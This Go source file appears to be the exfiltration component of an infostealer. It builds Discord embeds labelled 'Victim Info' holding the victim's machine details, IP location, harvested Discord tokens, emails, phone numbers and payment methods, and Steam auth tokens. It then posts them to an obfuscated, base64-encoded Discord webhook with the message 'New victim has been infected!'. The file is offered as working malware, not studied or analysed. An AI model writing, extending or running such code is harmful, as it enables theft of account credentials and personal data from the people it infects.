package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"strings"
)

var discordWebhookUrl string

type DiscordMessage struct {
	Content string         `json:"content"`
	Embeds  []DiscordEmbed `json:"embeds,omitempty"`
}

type DiscordEmbed struct {
	Title       string                 `json:"title,omitempty"`
	Description string                 `json:"description,omitempty"`
	Fields      []DiscordEmbedField    `json:"fields,omitempty"`
	Footer      *DiscordEmbedFooter    `json:"footer,omitempty"`
	Thumbnail   *DiscordEmbedThumbnail `json:"thumbnail,omitempty"`
	URL         string                 `json:"url,omitempty"`
}

type DiscordEmbedField struct {
	Name   string `json:"name"`
	Value  string `json:"value"`
	Inline bool   `json:"inline,omitempty"`
}

type DiscordEmbedFooter struct {
	Text string `json:"text"`
}

type DiscordEmbedThumbnail struct {
	URL string `json:"url"`
}

func SendDiscordNotification() error {
	computerInfo := []string{
		fmt.Sprintf("🖥️ **Computer Name:** `%s`", os.Getenv("COMPUTERNAME")),
		fmt.Sprintf("👤 **User Name:** `%s`", os.Getenv("USERNAME")),
		fmt.Sprintf("💾 **RAM:** %.0f GB", GetRAMTotal()),
		fmt.Sprintf("🧠 **CPU:** %s", GetCpuName()),
		fmt.Sprintf("🪟 **OS:** %s", GetFullOSName()),
	}
	ipInfo, err := GetIPInfo()
	if err != nil {
		panic(err)
	}

	embeds := []DiscordEmbed{
		{
			Title: "Victim Info",
			Fields: []DiscordEmbedField{
				{
					Name:   "💻 Computer Info",
					Value:  strings.Join(computerInfo, "\n"),
					Inline: true,
				},
				{
					Name: "📍 IP Info",
					Value: fmt.Sprintf(
						"**🌐 IP:** `%s`\n📍 **Location:** %s, %s, %s :flag_%s:\n**📡 ISP:** `%s`",
						ipInfo.IP, ipInfo.City, ipInfo.Region, ipInfo.Country, strings.ToLower(ipInfo.Country), ipInfo.Org,
					),
					Inline: true,
				},
			},
		},
	}

	for _, account := range discordAccountResults {
		badges := "None"
		if len(account.Badges) > 0 {
			badges = strings.Join(account.Badges, ", ")
		}
		nitro := "None"
		if account.NitroType == 1 {
			nitro = "Nitro Classic"
		} else if account.NitroType == 2 {
			nitro = "Nitro"
		} else if account.NitroType == 3 {
			nitro = "Nitro Basic"
		}
		paymentMethods := "None"
		if account.HasPaymentMethods && len(account.PaymentMethods) > 0 {
			paymentMethods = strings.Join(account.PaymentMethods, ", ")
		}
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Discord Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 User ID",
					Value:  fmt.Sprintf("`%s`", account.ID),
					Inline: true,
				},
				{
					Name:   "👤 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name:   "🏷️ Badges",
					Value:  badges,
					Inline: true,
				},
				{
					Name:   "💳 Payment Methods",
					Value:  paymentMethods,
					Inline: true,
				},
				{
					Name:   "✨ Nitro",
					Value:  nitro,
					Inline: true,
				},
				{
					Name:   "🔐 MFA Enabled",
					Value:  humanizeBoolean(account.HasMFA),
					Inline: true,
				},
				{
					Name: "📱 Phone",
					Value: func() string {
						if account.Phone != nil {
							return fmt.Sprintf("`%s`", *account.Phone)
						}
						return "None"
					}(),
					Inline: true,
				},
				{
					Name:   "📧 Email",
					Value:  fmt.Sprintf("`%s`", account.Email),
					Inline: true,
				},
				{
					Name:   "🔒 Token",
					Value:  fmt.Sprintf("```\n%s\n```", account.Token),
					Inline: false,
				},
			},
			URL: fmt.Sprintf("https://discord.com/users/%s", account.ID),
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			Footer: &DiscordEmbedFooter{
				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
			},
		})
	}
	for _, account := range steamAccountResults {
		embeds = append(embeds, DiscordEmbed{
			Title: fmt.Sprintf("Steam Account: %s", account.Username),
			Fields: []DiscordEmbedField{
				{
					Name:   "🆔 ID",
					Value:  fmt.Sprintf("`%s`", account.SteamID),
					Inline: true,
				},
				{
					Name:   "👤 Account Name",
					Value:  fmt.Sprintf("`%s`", account.AccountName),
					Inline: true,
				},
				{
					Name:   "🧑 Username",
					Value:  fmt.Sprintf("`%s`", account.Username),
					Inline: true,
				},
				{
					Name: fmt.Sprintf("👥 Friends (%d)", len(account.Friends)),
					Value: func() string {
						if len(account.Friends) > 0 {
							str := strings.Join(account.Friends, ", ")
							if len(str) > 1024 {
								return str[:1021] + "..."
							}
						}
						return "None"
					}(),
					Inline: false,
				},
				{
					Name: fmt.Sprintf("👪 Groups (%d)", len(account.Groups)),
					Value: func() string {
						if len(account.Groups) > 0 {
							str := strings.Join(account.Groups, ", ")
							if len(str) > 1024 {
								return str[:1021] + "..."
							}
						}
						return "None"
					}(),
					Inline: false,
				},
				{
					Name: "🔐 Auth Token",
					Value: func() string {
						if account.AuthToken != "" {
							return fmt.Sprintf("```\n%s\n```", account.AuthToken)
						}
						return "Not Found"
					}(),
					Inline: true,
				},
			},
			Thumbnail: &DiscordEmbedThumbnail{
				URL: account.AvatarURL,
			},
			URL: fmt.Sprintf("https://steamcommunity.com/profiles/%s", account.SteamID),
			Footer: &DiscordEmbedFooter{
				Text: fmt.Sprintf("Found in: %s", account.FoundIn),
			},
		})
	}

	message := DiscordMessage{
		Content: "New victim has been infected!",
		Embeds:  embeds,
	}
	payload, _ := json.Marshal(message)
	decoded, _ := base64.StdEncoding.DecodeString(discordWebhookUrl)
	res, err := http.Post(string(decoded), "application/json", strings.NewReader(string(payload)))
	if err != nil {
		return err
	}
	defer res.Body.Close()
	if res.StatusCode != http.StatusNoContent {
		return fmt.Errorf("failed to send Discord notification, status code: %d", res.StatusCode)
	}
	return nil
}
